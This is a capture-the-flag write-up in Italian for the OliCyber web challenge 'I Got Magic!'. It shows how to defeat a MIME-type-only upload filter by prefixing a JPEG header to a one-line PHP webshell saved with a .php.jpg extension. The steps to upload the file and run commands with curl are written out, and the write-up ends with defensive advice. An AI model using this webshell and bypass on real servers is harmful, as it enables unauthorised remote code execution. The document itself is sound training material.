# I Got Magic!

**Competizione:** OliCyber<br>
**Categoria:** Web / File Upload<br>
**URL:** http://got-magic.challs.olicyber.it

---

## Descrizione

> Questa pagina web è così noiosa, posso solo caricare le foto dei miei gattini preferiti. Riesci a fare qualcosa di più interessante?

L'obiettivo è aggirare il filtro di upload e caricare una **webshell PHP** per eseguire comandi remoti (RCE). La flag si trova in `/flag.txt`.

---

## Soluzione

### Step 1 — Analisi del filtro

Il sito permette l'upload di immagini. Il server valida il tipo di file controllando il **MIME type** (`image/jpeg`), ma non analizza il contenuto del file né blocca le **doppie estensioni**.

Questo ci permette di caricare un file con estensione `.php.jpg` che contiene codice PHP eseguibile.

---

### Step 2 — Creazione del payload

Creiamo un file con un header JPEG valido seguito da una webshell PHP:

```bash
# Genera un JPEG minimo valido (header + EOF marker)
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' \
  > /tmp/igotmagic.php.jpg

# Appende la webshell PHP in coda al JPEG
printf '<?php system($_GET["cmd"]); ?>' \
  >> /tmp/igotmagic.php.jpg

echo "Payload creato"
```

---

### Step 3 — Upload del file

```bash
curl -s -X POST http://got-magic.challs.olicyber.it/ \
  -F "image=@/tmp/igotmagic.php.jpg;type=image/jpeg" \
  -F "submit=Upload" \
  | grep -oP 'uploads/[^\s"<]+'
```

**Output:**
```
uploads/1773312376igotmagic.php.jpg
```

Il server ha accettato il file perché il MIME type era `image/jpeg`.

---

### Step 4 — Esecuzione di comandi via webshell

```bash
curl -s "http://got-magic.challs.olicyber.it/uploads/1773312376igotmagic.php.jpg?cmd=cat+/flag.txt"
```

**Output:**
```
flag{...}
```

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | Unrestricted File Upload + RCE |
| **Causa** | Validazione solo sul MIME type, non sull'estensione |
| **Vettore** | Doppia estensione `.php.jpg` eseguita come PHP |
| **Impatto** | Remote Code Execution sul server |

Il server controllava che il file fosse un'immagine verificando il MIME type dichiarato dal client (`image/jpeg`), ma il web server eseguiva comunque il file come PHP grazie alla doppia estensione `.php.jpg`.

---

## Conclusioni

- Non fidarsi mai del MIME type dichiarato dal client — è facilmente falsificabile
- Validare il contenuto del file, non solo l'header MIME
- Bloccare le doppie estensioni (`.php.jpg`, `.php.png`, ecc.)
- Salvare i file uploadati **fuori dalla web root** o in una directory non eseguibile
- Utilizzare un whitelist ristrittivo di estensioni e MIME type consentiti
- Rinominare i file uploadati con UUID o nomi casuali per evitare prevedibilità
- Configurare il web server per non eseguire script in directory di upload